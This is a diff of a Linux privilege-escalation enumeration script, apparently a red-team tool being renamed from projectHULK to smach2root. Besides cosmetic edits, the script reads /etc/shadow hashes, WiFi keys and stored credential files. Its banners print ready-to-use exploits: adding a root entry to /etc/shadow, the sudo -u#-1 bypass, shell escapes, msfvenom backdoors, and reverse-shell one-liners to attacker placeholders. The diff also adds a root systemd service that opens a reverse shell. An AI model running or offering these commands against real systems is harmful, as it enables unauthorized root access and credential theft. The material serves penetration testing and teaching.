@@ -1,9 +1,10 @@
 #!/bin/bash
 
 
+
 #------------------> Color Code:
 RED="\033[01;31m"
-BLUE="\033[0;37;44m"
+BLUE="\033[1;34;40m"
 GREEN="\033[01;32;40m"
 XX="\033[0m" #--- COLSE COLOR
 #------------------> Clear Screen:
@@ -19,13 +20,13 @@ echo -e "\n"
 echo -e "
 \t              ▄▄▄▄▄▄▄▄▄▄▄▄                
 \t            ████████████████              
-\t          ███████████████████▌             ██████╗███╗   ███╗ █████╗  ██████╗██╗  ██╗   ██████╗    ██████╗  █████╗  █████╗ ████████╗
-\t        ▐██████████████████████           ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║   ╚════██╗   ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
-\t          ▀▀▀▀████████████▀▀▀▀            ╚█████╗ ██╔████╔██║███████║╚█████╗ ███████║     ███╔═╝   ██████╔╝██║  ██║██║  ██║   ██║
-\t    ▄▄▄██                      ██▄▄▄       ╚═══██╗██║╚██╔╝██║██╔══██║ ╚═══██╗██╔══██║   ██╔══╝     ██╔══██╗██║  ██║██║  ██║   ██║
-\t██████████▄▄▄▄▄▄        ▄▄▄▄▄▄██████████  ██████╔╝██║ ╚═╝ ██║██║  ██║██████╔╝██║  ██║   ███████╗   ██║  ██║╚█████╔╝╚█████╔╝   ██║
-\t      ▀▀▀██████████████████████▀▀▀        ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚══════╝   ╚═╝  ╚═╝ ╚════╝  ╚════╝    ╚═╝
-\t                                          ═════════════════════════════════════════════════════{\033[01;31mPrivilege Escalation Script v2.5\033[0m}
+\t          ███████████████████▌             ██████╗███╗   ███╗ █████╗  ██████╗██╗  ██╗     ██████╗      ██████╗  █████╗  █████╗ ████████╗
+\t        ▐██████████████████████           ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║     ╚════██╗     ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
+\t          ▀▀▀▀████████████▀▀▀▀            ╚█████╗ ██╔████╔██║███████║╚█████╗ ███████║       ███╔═╝     ██████╔╝██║  ██║██║  ██║   ██║
+\t    ▄▄▄██                      ██▄▄▄       ╚═══██╗██║╚██╔╝██║██╔══██║ ╚═══██╗██╔══██║     ██╔══╝       ██╔══██╗██║  ██║██║  ██║   ██║
+\t██████████▄▄▄▄▄▄        ▄▄▄▄▄▄██████████  ██████╔╝██║ ╚═╝ ██║██║  ██║██████╔╝██║  ██║     ███████╗     ██║  ██║╚█████╔╝╚█████╔╝   ██║
+\t      ▀▀▀██████████████████████▀▀▀        ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝     ╚══════╝     ╚═╝  ╚═╝ ╚════╝  ╚════╝    ╚═╝
+\t                                          ═════════════════════════════════════════════════════════{\033[01;31mPrivilege Escalation Script v2.5\033[0m}
 \t                                          Tʜɪs sᴄʀɪᴘᴛ ɪs ᴏɴᴇ ᴏғ ᴘʀᴏᴊᴇᴄᴛHULK sᴄʀɪᴘᴛs, ɪᴛ ʜᴀs ʙᴇᴇɴ ᴅᴇsɪɢɴᴇᴅ ᴛᴏ sᴜᴘᴘᴏʀᴛ (SOC & Rᴇᴅ Tᴇᴀᴍ) 
 \t         █                  █             ᴏʀ ɪᴛ  ᴄᴀɴ ʙᴇ ᴜsᴇ ғᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ  ᴘᴜʀᴘᴏsᴇs ɪɴ ғɪɴᴅɪɴɢ sʏsᴛᴇᴍ ᴠᴜʟɴᴇʀᴀʙɪʟɪᴛɪᴇs ᴛʜᴀᴛ ᴍᴀʏ ʟᴇᴀᴅ 
 \t          █    ██▀▀▀▀██    █              ᴛᴏ ᴘʀɪᴠɪʟᴇɢᴇ  ᴇsᴄᴀʟᴀᴛɪᴏɴ & ᴇxᴘʟᴏɪᴛᴇ ɪᴛ. Tʜᴇ sᴄʀɪᴘᴛ sʜᴏᴜʟᴅ ʙᴇ ᴜsᴇᴅ  ɪɴ sᴀғᴇ ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ. Tʜᴇ 
@@ -35,24 +36,25 @@ echo -e "
 \t                 ████
 "
 sleep 1
-echo -e "\n${BLUE}Author:${XX}"
+echo -e "\n${BLUE}Aᴜᴛʜᴏʀ:${XX}"
 sleep 0.1
 echo -e "\t   Iʀᴏɴ Hᴜʟᴋ"
 echo -e "\tMᴀɴ Iɴ A Bʟᴀᴄᴋ Tᴜxᴇᴅᴏ"
 sleep 0.1
-echo -e "\n${BLUE}Tweet Me:${XX}"
+echo -e "\n${BLUE}Tᴡᴇᴇᴛ Mᴇ:${XX}"
 sleep 0.1
 echo -e "\tɪʀᴏɴʜᴜʟᴋ_x69"
 sleep 0.1
-echo -e "\n${BLUE}Message:${XX}"
+echo -e "\n${BLUE}Mᴇssᴀɢᴇ:${XX}"
 sleep 0.1
 echo -e "\tAʟʟ ᴛʜᴇ ᴇxᴘʟᴏɪᴛs ʜᴀᴠᴇ ʙᴇᴇɴ ʟɪsᴛᴇᴅ ʙᴀsᴇᴅ ᴏɴ ᴛʜᴇ ᴀᴜᴛʜᴏʀ's ᴏᴘɪɴɪᴏɴ, ʏᴏᴜ ᴍᴀʏ ᴜsᴇ ᴀɴʏ ᴏғ ʏᴏᴜʀ ᴄʜᴏɪᴄᴇ. Rᴇᴍᴇᴍᴇʙʀ, SKY HAS NO LIMITS :)"
 sleep 0.1
-echo -e "\n${BLUE}Recommendation:${XX}"
+echo -e "\n${BLUE}Rᴇᴄᴏᴍᴍᴇɴᴅᴀᴛɪᴏɴ:${XX}"
 sleep 0.1
 echo -e "\tFᴏʀ ᴀ ʙᴇᴛᴛᴇʀ ᴠɪᴇᴡ ᴏғ ᴛʜᴇ ʀᴇᴘᴏʀᴛ ɪs ɪᴛ ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ ʀᴇᴅɪʀᴇᴄᴛɪɴɢ ᴛʜᴇ ᴏᴜᴛᴘᴜᴛ ᴛᴏ ᴀ ғɪʟᴇ: ./ᴘʀᴏᴊᴇᴄᴛHULK.sʜ > PE_ʀᴇᴘᴏʀᴛ.ᴛxᴛ"
 echo -e "\tNᴇᴠᴇʀ ʀᴇʟᴀʏ ᴏɴ ᴀ sɪɴɢʟᴇ ᴛᴏᴏʟ, ᴅᴏ ᴍᴀɴᴜᴀʟ ᴇɴᴜᴍᴇʀᴀᴛɪᴏɴ ᴀɴᴅ ᴛʀʏ ᴛᴏ ᴜsᴇ ᴍᴀɴʏ ᴛᴏᴏʟs ᴀs ᴍᴜᴄʜ ᴀs ʏᴏᴜ ᴄᴀɴ."
-echo -e "\n${BLUE}Scan Started At:${XX}"
+sleep 0.1
+echo -e "\n${BLUE}Sᴄᴀɴ Sᴛᴀʀᴛᴇᴅ Aᴛ:${XX}"
 echo -e "\t"; date
 sleep 5
 echo -e "\n\n${RED}\t\tEnumeration on progress ╔═..................................(1%)......................................${XX}\n"
@@ -162,7 +164,7 @@ echo -e "\n${BLUE}[+] Password file:${XX}"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If the file has written permission, it can be abused by adding a new user with  ║"
         echo -e "\t║root privilege to the file. If it's no't writable, then it's protected.         ║"
-        echo -e "\t║${RED}exploit :${XX}                                                                       ║"
+        echo -e "\t║${RED}Exploit:${XX}                                                                        ║"
         echo -e "\t║${RED}First, generate a password with one of the following commands:${XX}                  ║"
         echo -e "\t║    ${RED}openssl passwd -1 -salt hulk password${XX}                                       ║"
         echo -e "\t║    ${RED}perl -le 'print crypt(hulk, password)'${XX}                                      ║"
@@ -187,13 +189,11 @@ echo -e "\n${BLUE}[+] Shadow file:${XX}"
         echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If the file has read/write permission, it can abuse by replacing the root HASH     ║"
         echo -e "\t║with the attacker's HASH or the attacker my copy the hash & try to crack it.       ║"
-        echo -e "\t║${RED}exploit :${XX}                                                                          ║"
-        echo -e "\t║${RED}1) Generate a new Shadow Hash and replace it with the${XX}                              ║"
-        echo -e "\t║   ${RED}current root hash:${XX}                                                              ║"
+        echo -e "\t║${RED}Exploit:${XX}                                                                           ║"
+        echo -e "\t║${RED}1) Generate a new Shadow Hash and replace it with the current root hash:${XX}           ║"
         echo -e "\t║    ${RED}- mkpasswd  -m sha-512 -S prove123 -s${XX}                                          ║"
-        echo -e "\t║${RED}2) Open the shadow file using any text edirot of your choice:${XX}                      ║"
-        echo -e "\t║   ${RED}or copy your HASH from your system and replace it with${XX}                          ║"
-        echo -e "\t║   ${RED}the root hash${XX}                                                                   ║"
+        echo -e "\t║${RED}2) Open the shadow file using any text editor of your choice:${XX}                      ║"
+        echo -e "\t║   ${RED}or copy your HASH from your system and replace it with the root hash${XX}            ║"
         echo -e "\t║${RED}3) Login to root using your password${XX}                                               ║"
         echo -e "\t║${RED}4) Or Simply do:${XX}                                                                   ║"
         echo -e "\t║${RED}echo 'privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash' >> /etc/shadow${XX}             ║"
@@ -209,8 +209,8 @@ echo -e "\n${BLUE}[+] Hash in Shadow file: (Interesting :D)${XX}"
     grep  -v '*:\|!:' /etc/shadow
         echo -e "\t╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Crack the hash using online website or any cracking tools or simply do:                              ║"
-        echo -e "\t║    unshadow /etc/passwd /etc/shadow > shadow.john                                                   ║"
-        echo -e "\t║    john shadow.john --wordlist=<WORLD_LIST>                                                         ║"
+        echo -e "\t║    ${RED}unshadow /etc/passwd /etc/shadow > shadow.john${XX}                                                   ║"
+        echo -e "\t║    ${RED}john shadow.john --wordlist=<WORLD_LIST>${XX}                                                         ║"
         echo -e "\t║If you own the system and have root, you can use MimiPenguin to crack it:                            ║"
         echo -e "\t║    https://github.com/huntergregal/mimipenguin                                                      ║"
         echo -e "\t║    https://github.com/sevagas/swap_digger                                                           ║"
@@ -243,7 +243,7 @@ echo -e "\n${BLUE}[+] WiFi Creds:${XX}"
 echo -e "\n${BLUE}[+] Sensitive files:${XX}"
     ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null
         echo -e "\t╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║See if any listed files have weak file permission.                                                   ║"
+        echo -e "\t║${RED}See if any listed files have weak file permission.${XX}                                                   ║"
         echo -e "\t╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] htpasswd:${XX}"
     find / -name .htpasswd -print -exec cat {} \; 2>/dev/null 
@@ -271,7 +271,7 @@ echo -e "\n${BLUE}[+] smb.conf:${XX}"
     cat /etc/samba/smb.conf | grep -i 'pass\|cred\|hash' --color=always
         echo -e "\t╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║To list all files having the word password/credentials/hash do the following manually:               ║"
-        echo -e '\t║grep -rn -i "pass\|cred\|hash" / --color=always > password.txt                                       ║'
+        echo -e "\t║${RED}grep -rn -i 'pass\|cred\|hash' / --color=always > password.txt${XX}                                       ║"
         echo -e "\t╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
         echo -e "\n${BLUE}[+] Dump cleartext Pre-Shared Wireless Keys:${XX}"
     cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"
@@ -281,8 +281,8 @@ echo -e "\n${BLUE}[+] Firefox credentials:${XX}"
     ls -la /home/$USER/.mozilla/firefox 2>/dev/null
         echo -e "\t╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Password files are:                                                                                  ║"
-        echo -e "\t║  key4.db                                                                                            ║"
-        echo -e "\t║  logins.json                                                                                        ║"
+        echo -e "\t║    key4.db                                                                                          ║"
+        echo -e "\t║    logins.json                                                                                      ║"
         echo -e "\t║Read more about where Firefox stores your bookmarks, passwords and other user data:                  ║"
         echo -e "\t║    https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data                     ║"
         echo -e "\t║You can use firefox_decrypt.py tool:                                                                 ║"
@@ -297,12 +297,12 @@ sleep 1
 echo -e "\n${BLUE}[+] System Name:${XX}"
     uname -a 2>/dev/null
         echo -e "\t╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║Useful tools to help you in finding kernel exploit :                                                 ║"
+        echo -e "\t║Useful tools to help you in finding kernel exploit:                                                  ║"
         echo -e '\t║  https://github.com/spencerdodd/kernelpop                                                           ║'
         echo -e '\t║  https://github.com/jondonas/linux-exploit-suggester-2                                              ║'
         echo -e "\t╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
         echo -e "\n${BLUE}[+] System Release:${XX}"
-    lsb_release -a 2>/dev/null 
+    cat /etc/*-release 2>/dev/null 
 echo -e "\n${BLUE}[+] Host name:${XX}"
     hostname 2>/dev/null 
 echo -e "\n${BLUE}[+] System Version:${XX}"
@@ -339,7 +339,7 @@ echo -e "\n${BLUE}[+] Is sudo version vulnerable?${XX}"
     sudo -V | grep --color=always "Sudo ver" | grep --color=always "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]" 
         echo -e "\t╔══════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If the sudo version <= v1.28, it is exploitable.                              ║"
-        echo -e "\t║${RED}exploit :${XX}                                                                     ║"
+        echo -e "\t║${RED}Exploit:${XX}                                                                      ║"
         echo -e "\t║  ${RED}sudo -u#-1 /bin/bash${XX}                                                        ║"
         echo -e "\t╚══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Available shells:${XX}"
@@ -386,6 +386,23 @@ echo -e "\n${BLUE}[+] ASLR Address Space:${XX}"
     ldd /bin/bash
 echo -e "\n${BLUE}[+] SELinux status:${XX}"
     sestatus 2>/dev/null
+echo -e "\n${BLUE}[+] Abusing systemctl:${XX}"
+        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║Create NewRCE.service and write:                                                              ║"
+        echo -e "\t║    [Unit]                                                                                    ║"
+        echo -e "\t║    Description=rooooot                                                                       ║"
+        echo -e "\t║    [Service]                                                                                 ║"
+        echo -e "\t║    Type=simple                                                                               ║"
+        echo -e "\t║    User=root                                                                                 ║"
+        echo -e "\t║    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/a.a.a.a/443 0>&1'                             ║"
+        echo -e "\t║    [Install]                                                                                 ║"
+        echo -e "\t║    wantedBy=multi-user.target                                                                ║"
+        echo -e "\t║Open listener on your machine                                                                 ║"
+        echo -e "\t║    nc -nlvp 443                                                                              ║"
+        echo -e "\t║On Victim Machine:                                                                            ║"
+        echo -e "\t║    systemctl enable /tmp/NewRCE.service                                                      ║"
+        echo -e "\t║    systemctl start NewRCE                                                                    ║"                                                                   
+        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n\n${RED}\t\tEnumeration on progress ╔══════════════════.................(20%).....................................${XX}\n"
 sleep 5
 echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
@@ -470,7 +487,7 @@ echo -e "\n\033[0;37;41mRun this command manually: find / -writable -type f 2>/d
         echo -e "\t║If you find a script that is owned by root but is writable by anyone, you can ║"
         echo -e "\t║add your own malicious code into it and it will escalate your privileges when ║"
         echo -e "\t║the script runs as root                                                       ║"
-        echo -e "\t║${RED}exploit :${XX}                                                                     ║"
+        echo -e "\t║${RED}Exploit:${XX}                                                                      ║"
         echo -e "\t║  ${RED}bash: echo 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' >> file${XX} ║"
         echo -e "\t║  ${RED}netcat: echo 'nc <attacker_IP> <attacker_PORT> -e /bin/sh' >> file${XX}          ║"
         echo -e "\t╚══════════════════════════════════════════════════════════════════════════════╝"
@@ -487,12 +504,12 @@ echo -e "\n${BLUE}[+] How Files Can Be Upload/Download:${XX}"
         echo -e "\t╚══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Unexpected commands allows you to read and/or write files or even execute command:${XX}"
         echo -e "\t╔══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e '\t║sudo awk "BEGIN {system("/bin/sh")}"                                          ║'
-        echo -e "\t║sudo find /etc -exec sh -i \;                                                 ║"
-        echo -e "\t║sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh                          ║"
-        echo -e "\t║sudo tar c a.tar -I ./runme.sh a                                              ║"
-        echo -e "\t║ftp>!/bin/sh                                                                  ║"
-        echo -e "\t║less>! <shell_comand>                                                         ║"
+        echo -e "\t║${RED}sudo awk 'BEGIN {system('/bin/sh')}'${XX}                                          ║"
+        echo -e "\t║${RED}sudo find /etc -exec sh -i \;${XX}                                                 ║"
+        echo -e "\t║${RED}sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh${XX}                          ║"
+        echo -e "\t║${RED}sudo tar c a.tar -I ./runme.sh a${XX}                                              ║"
+        echo -e "\t║${RED}ftp>!/bin/sh${XX}                                                                  ║"
+        echo -e "\t║${RED}less>! <shell_comand>${XX}                                                         ║"
         echo -e "\t║                                Give it a try                                 ║"
         echo -e "\t╚══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Profiles files:${XX}"
@@ -535,8 +552,8 @@ echo -e "\n${BLUE}[+] Shared object libraries (GOOD FOR BACKDOOR):${XX}"
 echo -e "\n${BLUE}[+] Is the executable compiled with RPATH or RUNPATH (GOOD FOR BACKDOOR):${XX}"
     objdump -x /usr/local/bin/program 2>/dev/null | grep -i "RPATH\|RUNPATH"
         echo -e "\t╔══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║If any executable is found, create the backdoor using any payload you wich    ║"
-        echo -e "\t║using the same file found.                                                    ║"
+        echo -e "\t║If any executable is found, create the backdoor using any payload you wich,   ║"
+        echo -e "\t║using the same file name found.                                               ║"
         echo -e "\t║For Example:                                                                  ║"
         echo -e "\t║Payload using msfvenome:                                                      ║"
         echo -e "\t║   msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker IP>         ║"
@@ -566,7 +583,7 @@ echo -e "\n${BLUE}[+] Scheduled Jobs:${XX}"
         echo -e "\n\033[0;37;41mIf the File is Writable${XX}"
         echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If the file is running by root, & writable to anyone, the attacker my replace the content of the file.    ║"
-        echo -e "\t║${RED}exploit :${XX}                                                                                                 ║"
+        echo -e "\t║${RED}Exploit:${XX}                                                                                                  ║"
         echo -e "\t║  ${RED}echo '/bin/sh' >> file${XX}                                                                                  ║"
         echo -e "\t║  ${RED}echo '/bin/bash' >> file ${XX}                                                                               ║"
         echo -e "\t║  ${RED}echo 'bash -i >& /dev/tcp/a.a.a.a/4242 0>&1' >> file${XX}                                                    ║"
@@ -589,6 +606,8 @@ echo -e "\n${BLUE}[+] Full Network Details:${XX}"
     ifconfig
 echo -e "\n${BLUE}[+] Firewall Rulls:${XX}"
     iptables -nvL 2>/dev/null
+echo -e "\n${BLUE}[+] Other users & hosts are communicating with the system:${XX}"
+    lsof -i
 echo -e "\n${BLUE}[+] Open Ports:${XX}"
     netstat -tulpna
         echo -e "\t╔══════════════════════════════════════════════════════════════════════════════╗"
@@ -607,9 +626,9 @@ echo -e "\n${BLUE}[+] ARP Cashe:${XX}"
     arp; arp -en | grep -v Address
 echo -e "\n${BLUE}[+] Pivoting:${XX}"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║Try to scan the Host network and see if there is any other host are online, use any of:                             ║"
+        echo -e "\t║Try to scan the host network and see if there is any other host online, use any of:                                 ║"
         echo -e '\t║  for ip in $(seq 1 255); do ping -c 1 v.v.v.$ip | grep "bytes from"; done                                          ║'
-        echo -e "\t║  for i in {1..255}; do ping -c 1 v.v.v.$i | grep 'bytes from' ; done                                                 ║"
+        echo -e '\t║  for i in {1..255}; do ping -c 1 v.v.v.$i | grep "bytes from" ; done                                               ║'
         echo -e '\t║  for i in {1..255} ;do (ping v.v.v.$i -c 1 -w 5  >/dev/null && echo "v.v.v.$i Host Is Alive") ; done               ║'
         echo -e "\t║We won't be able to access those machine, therefor, will have to do tunneling from the current machine to them.     ║"
         echo -e "\t║Read More:                                                                                                          ║"
@@ -645,14 +664,14 @@ echo -e "\n\033[0;37;41mExploiting Misconfigured SSH Keys${XX}"
         echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Secure Shell (SSH) is a cryptographic network protocol which allows users to securely      ║"
         echo -e "\t║perform a number of network services, such as remote authentication or file transfer over  ║"
-        echo -e "\t║an unsecured network. exploit :                                                            ║"
+        echo -e "\t║an unsecured network. exploit:                                                             ║"
         echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/ ║"
         echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] id_rsa:${XX}"
     find / -name id_rsa 2>/dev/null 
         echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If anyone have access to any user's id_rsa, he can login to the system using that key.     ║"
-        echo -e "\t║${RED}exploit :${XX}                                                                                  ║"
+        echo -e "\t║${RED}Exploit:${XX}                                                                                   ║"
         echo -e "\t║  ${RED}scp -P 22 username@v.v.v.v:/path/to/id_rsa /path/to/attacker${XX}                             ║"
         echo -e "\t║  ${RED}chmod 0600 id_rsa${XX}                                                                        ║"
         echo -e "\t║  ${RED}ssh -p 22 user-of-id_rsa@v.v.v.v -i id_rsa${XX}                                               ║"
@@ -766,31 +785,31 @@ echo -e "\n${BLUE}[+] Config Files:${XX}"
 echo -e "\n${BLUE}[+] Bash Files:${XX}"
     find / -name *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/firmware-mod-kit/"
         echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║projectHULK search has excluded the following directory:-                      ║"
+        echo -e "\t║smach2root search has excluded the following directory:-                       ║"
         echo -e "\t║  /usr/*       |  /opt/firmware-mod-kit/*                                      ║"
         echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Python Files:${XX}"
     find / -name *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/firmware-mod-kit/\|/opt/xplico/"
         echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║projectHULK search has excluded the following directory:-                      ║"
+        echo -e "\t║smach2root search has excluded the following directory:-                       ║"
         echo -e "\t║  /usr/*       |  /opt/firmware-mod-kit/*       |  /opt/xplico/*               ║"
         echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] PHP Files:${XX}"
     find / -name *.php -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/share\|/opt/xplico"
         echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║projectHULK search has excluded the following directory:-                      ║"
+        echo -e "\t║smach2root search has excluded the following directory:-                       ║"
         echo -e "\t║  /usr/*       |  /opt/xplico/*                                                ║"
         echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Text Files:${XX}"
     find / -name *.txt 2>/dev/null | grep -v "/usr/\|/opt/\|/etc/\|/root/.*" | xargs ls -la --color=always 2>/dev/null
         echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║projectHULK search has excluded the following directory:-                      ║"
+        echo -e "\t║smach2root search has excluded the following directory:-                       ║"
         echo -e "\t║  /usr/*       |  /opt/       |  /etc/       |  /root/.*                       ║"
         echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] HTML Files:${XX}"
     find / -name *.html 2>/dev/null | grep -v "/usr/" | xargs ls -la --color=always 2>/dev/null 
         echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║projectHULK search has excluded the following directory:-                      ║"
+        echo -e "\t║smach2root search has excluded the following directory:-                       ║"
         echo -e "\t║  /usr/*                                                                       ║"
         echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] .GPG Files:${XX}"
